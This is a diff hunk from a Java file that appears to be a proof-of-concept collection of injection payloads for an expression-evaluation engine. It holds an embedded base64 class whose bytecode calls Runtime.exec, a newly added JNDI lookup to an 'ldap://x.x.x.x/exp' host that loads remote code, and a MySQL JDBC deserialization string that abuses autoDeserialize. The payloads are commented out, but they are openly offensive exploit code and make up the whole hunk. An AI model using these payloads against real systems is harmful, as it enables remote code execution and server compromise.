@@ -23,6 +23,8 @@ public static void main(String[] args) throws Exception {
         DefaultContext<String, Object> ctx = new DefaultContext<>();
         //bytecode loading(Not suitable for jdk high version)
         //Object obj = runner.execute("import org.springframework.cglib.core.ReflectUtils;import javax.xml.bind.DatatypeConverter;byte[] bytes = DatatypeConverter.parseBase64Binary(\"yv66vgAAADQAIQoACAASCAATCgAUABUKABQAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAFwEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAkACgEABGNhbGMHABsMABwAHQwAHgAfAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAIAAKAQAXQnl0ZXNDb2RlR2VuZXJhdG9yL0V4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAUACAANAAoAAQALAAAAVQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAIADAAAABoABgAAAAgAAwAJAAsADAAOAAoADwALABMADQAOAAAABwACTgcADwQAAQAQAAAAAgAR\");ReflectUtils.defineClass(\"BytesCodeGenerator.Exec\", bytes, Thread.currentThread().getContextClassLoader());", ctx, null, true, false);
+        //jndi注入
+        //Object obj = runner.execute("import javax.naming.InitialContext;InitialContext.doLookup(\"ldap://x.x.x.x/exp\");", ctx, null, true, false);
         //jdbc deserialization
         //Object obj = runner.execute("import java.sql.DriverManager;DriverManager.getConnection(\"jdbc:mysql://x.x.x.x/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=df3fde8\");", ctx, null, true, false);
         //snakeyaml deserialization
